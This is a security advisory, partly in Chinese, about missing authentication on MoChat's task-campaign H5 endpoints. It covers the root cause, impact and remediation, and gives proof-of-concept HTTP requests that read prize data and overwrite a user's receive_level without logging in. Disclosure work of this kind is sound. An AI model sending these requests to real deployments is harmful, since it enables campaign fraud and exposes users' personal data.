# MoChat — 任务宝 H5 接口未鉴权读写 (MC-VULN-006)

| Field | Value |
|-------|-------|
| **Vendor** | mochat-cloud |
| **Product** | MoChat |
| **Version** | master（Hyperf 2.2） |
| **Type** | Missing Authentication for Critical Function |
| **CWE** | CWE-306 / CWE-639 |
| **Authentication** | None |

## Summary

`/operation/workFission/taskData` leaks campaign prizes; `PUT /operation/workFission/receive` updates `receive_level` with empty validation.

## Root cause

Operation Action classes lack any `@Middleware`; `Receive::rules()` returns `[]`.

## Proof of Concept

```
# Read task + prize URL
GET /operation/workFission/taskData?union_id=union_poc_test&fission_id=1 HTTP/1.1
Host: 127.0.0.1:9501
Connection: close

# Arbitrary receive_level write
PUT /operation/workFission/receive HTTP/1.1
Host: 127.0.0.1:9501
Content-Type: application/json
Connection: close

{"union_id":"union_poc_test","level":5}
```

**Expected:** HTTP 200; DB `receive_level` updated without login

## Impact

Campaign fraud, PII leak (nicknames/avatars via inviteFriends), prize URL disclosure.

## Remediation

H5 session/signed token; validate union_id ownership; server-side level checks.

## References

- Audit: `SECURITY_AUDIT_REPORT.md` §MC-VULN-006
- PoC: `POC_VERIFICATION_REPORT.md`
